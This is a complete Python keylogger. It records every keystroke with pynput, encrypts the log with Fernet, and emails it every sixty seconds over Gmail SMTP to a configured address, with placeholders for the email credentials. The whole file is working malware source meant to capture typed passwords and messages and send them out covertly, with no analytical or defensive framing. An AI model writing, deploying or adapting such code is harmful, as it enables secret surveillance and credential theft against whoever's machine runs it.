from pynput import keyboard
import smtplib
import threading
from email.mime.text import MIMEText
from cryptography.fernet import Fernet
import os

# === CONFIGURATION ===
EMAIL_ADDRESS = "youremail@gmail.com"
EMAIL_PASSWORD = "your_app_password"
SEND_INTERVAL = 60  # seconds
LOG_FILE = "keylog_encrypted.txt"
KEY_FILE = "secret.key"

# === KEY MANAGEMENT ===
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)

if not os.path.exists(KEY_FILE):
    generate_key()

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_data(data, key):
    f = Fernet(key)
    return f.encrypt(data.encode())

# === KEYLOGGER SETUP ===
buffer = ""
key = load_key()

def on_press(k):
    global buffer
    try:
        buffer += k.char
    except AttributeError:
        buffer += f'[{k.name}]'

# === SEND ENCRYPTED LOGS VIA EMAIL ===
def send_email():
    global buffer
    if buffer.strip():
        encrypted = encrypt_data(buffer, key)

        msg = MIMEText(encrypted.decode())  # Send as readable base64 string
        msg["Subject"] = "Encrypted Keylog Report"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS

        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.send_message(msg)
        except Exception as e:
            print(f"[!] Email send failed: {e}")

        buffer = ""

    # Reschedule
    threading.Timer(SEND_INTERVAL, send_email).start()

# === RUN ===
listener = keyboard.Listener(on_press=on_press)
listener.start()
send_email()
listener.join()
